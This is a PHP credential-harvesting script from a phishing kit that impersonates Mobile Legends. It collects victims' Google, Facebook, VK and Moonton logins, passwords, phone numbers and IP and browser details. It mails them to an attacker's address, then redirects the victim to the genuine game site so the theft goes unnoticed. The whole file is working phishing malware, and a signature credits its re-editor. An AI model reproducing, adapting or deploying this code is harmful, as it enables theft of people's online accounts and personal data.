<?php

include('cilepeung.php');

$email    = $_POST['email'];
$pass = $_POST['pass'];
$sk = $_POST['sk'];
$lv = $_POST['lv'];
$no = $_POST['no'];
$recover = $_POST['recovery'];
$passe = $_POST['passre'];
$email1    = $_POST['email1'];
$pass1 = $_POST['pass1'];
$nk = $_POST['nk'];
$cn = $_POST['cn'];
$vk = $_POST['vk'];
$vk2 = $_POST['vk2'];
$mo = $_POST['mo'];
$mo2 = $_POST['mo2'];


$message   = "


===[GOOGLE ACCOUNT]===

NICK / ID PLAYER : ".$nk."
Email : ".$email."
Password :  ".$pass."

===[FACEBOOK ACCOUNT]===

Email : ".$email1."
Password :  ".$pass1."

===[VK ACCOUNT]===

Email : ".$vk."
Password :  ".$vk2."

===[MOONTON ACCOUNT]===

Email : ".$mo."
Password :  ".$mo2."

===[ACCOUNT DETAIL]===

Skin : ".$sk."
level :  ".$lv."
numberphone : ".$no."
country :  ".$cn."

+++++ INFO +++++

IP Info   :  ".$alamat." | ".$nama_negro." On ".gmdate('r')."
Browser   :  ".$_SERVER['HTTP_USER_AGENT']."

+++++ SAHRUL VAN KHAN +++++


";

include 'email.php';
$subject = "Akun ".$cn." SKIN (".$sk.") (".$lv.")";
$headers = "From: [SAHRUL SETOR RESULT]  <badawi@mailers.love>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));

?>

<script>window.location.replace("http://web.mobilelegends.com")</script>';}
}
?>

<!--SCRIPT REEDIT BY: SAHRUL VAN KHAN http://facebook.com/sahrulkhan007 -->
<!--SIDRAP SULSEL- INDONESIA - 2018-->